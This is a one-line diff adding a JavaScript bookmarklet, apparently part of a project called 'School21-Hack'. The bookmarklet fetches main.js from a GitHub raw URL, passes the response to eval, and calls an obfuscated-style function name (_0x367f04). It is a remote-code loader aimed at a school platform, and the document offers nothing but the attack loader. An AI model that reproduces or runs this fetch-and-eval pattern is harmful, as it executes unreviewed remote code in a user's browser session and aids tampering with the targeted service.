@@ -1,0 +1,1 @@
+javascript:req = new XMLHttpRequest(); req.open('GET', 'https://raw.githubusercontent.com/VirescentOverlord/School21-Hack/main/main.js'); req.onload = function() { eval(this.responseText + '_0x367f04();'); }; req.send();
